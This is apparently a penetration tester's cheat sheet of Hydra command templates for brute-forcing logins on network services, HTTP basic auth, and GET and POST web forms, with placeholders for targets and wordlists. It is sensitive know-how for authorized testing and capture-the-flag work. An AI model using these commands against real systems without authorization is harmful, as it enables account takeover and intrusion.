hydra -l/L <username/userlist> -p/P <password/wordlist> <protocol>://<IP/FQDN>:<port> # Example network service bruteforce

hydra -l <username> -P <wordlist> <IP> http-get-form "<form-name>?username=^USER^&password=^PASS^:S=logout.php" -f # example GET form brute

hydra -l basic-auth-user -P <wordlist> <FQDN/IP> http-get / -s port # Example HTTP auth

hydra -l <username> -P <wordlist> -f <FQDN/IP> -s <port> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" # Example POST form brute
